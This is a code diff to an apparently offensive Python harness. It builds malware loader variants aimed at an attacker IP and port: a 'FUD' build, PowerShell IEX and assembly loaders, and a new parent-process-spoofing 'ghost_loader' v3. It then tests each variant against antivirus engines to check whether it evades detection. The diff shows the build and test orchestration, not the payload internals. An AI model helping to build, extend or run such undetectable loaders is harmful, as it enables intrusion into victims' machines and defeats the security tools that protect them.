@@ -382,15 +382,20 @@ def build_fud():
     ok(f"FUD -> {os.path.basename(dst)}")
     return dst
 
-def build_ghost_loader(ip, port):
-    info(f"Building ghost_loader (target {ip}:{port})...")
-    run_silent([sys.executable, BUILD_GL, ip, str(port)])
+def build_ghost_loader(ip, port, v3=False):
+    ver = "v3[ParentSpoof]" if v3 else "v2[Direct]"
+    info(f"Building ghost_loader {ver} (target {ip}:{port})...")
+    cmd = [sys.executable, BUILD_GL, ip, str(port)]
+    if v3:
+        cmd.append("--v3")
+    run_silent(cmd)
     src = os.path.join(SHELL_DIR, "ghost_loader.exe")
     if not os.path.exists(src):
-        fail("ghost_loader.exe not produced"); return None
-    dst = os.path.join(TEST_DIR, "t_ghost_loader.exe")
+        fail(f"ghost_loader.exe ({ver}) not produced"); return None
+    label = "t_ghost_loader_v3.exe" if v3 else "t_ghost_loader.exe"
+    dst = os.path.join(TEST_DIR, label)
     shutil.copy2(src, dst)
-    ok(f"Ghost Loader -> {os.path.basename(dst)}")
+    ok(f"Ghost Loader {ver} -> {os.path.basename(dst)}")
     return dst
 
 def build_ghost_ps1(ip, port, method="iex"):
@@ -627,6 +632,7 @@ def main():
         t_base  = os.path.join(TEST_DIR, "t_baseline.exe")
         t_fud   = os.path.join(TEST_DIR, "t_fud.exe")
         t_gl    = os.path.join(TEST_DIR, "t_ghost_loader.exe")
+        t_gl_v3 = os.path.join(TEST_DIR, "t_ghost_loader_v3.exe")
         t_ps1   = os.path.join(TEST_DIR, "t_ghost_iex.ps1")
         t_asm   = os.path.join(TEST_DIR, "t_ghost_assembly.ps1")
         t_vader = os.path.join(TEST_DIR, "t_vader_chain.ps1")
@@ -634,7 +640,8 @@ def main():
     else:
         t_base  = build_baseline()
         t_fud   = build_fud()
-        t_gl    = build_ghost_loader(ip, port)
+        t_gl    = build_ghost_loader(ip, port, v3=False)   # v2: direct spawn
+        t_gl_v3 = build_ghost_loader(ip, port, v3=True)   # v3: parent spoof
         if not ARGS.skip_ghost:
             t_ps1   = build_ghost_ps1(ip, port, method="iex")
             t_asm   = build_ghost_ps1(ip, port, method="assembly")
@@ -661,8 +668,13 @@ def main():
                  lambda p: run_exe(p, ["127.0.0.1", str(port)]),
                  kavs, ARGS.static_only, watcher)
 
-    test_variant("Ghost Loader (XOR+b64)",
+    test_variant("Ghost Loader v2 (direct)",
                  t_gl,
+                 lambda p: run_exe(p),
+                 kavs, ARGS.static_only, watcher)
+
+    test_variant("Ghost Loader v3 (parent spoof)",
+                 t_gl_v3,
                  lambda p: run_exe(p),
                  kavs, ARGS.static_only, watcher)
 
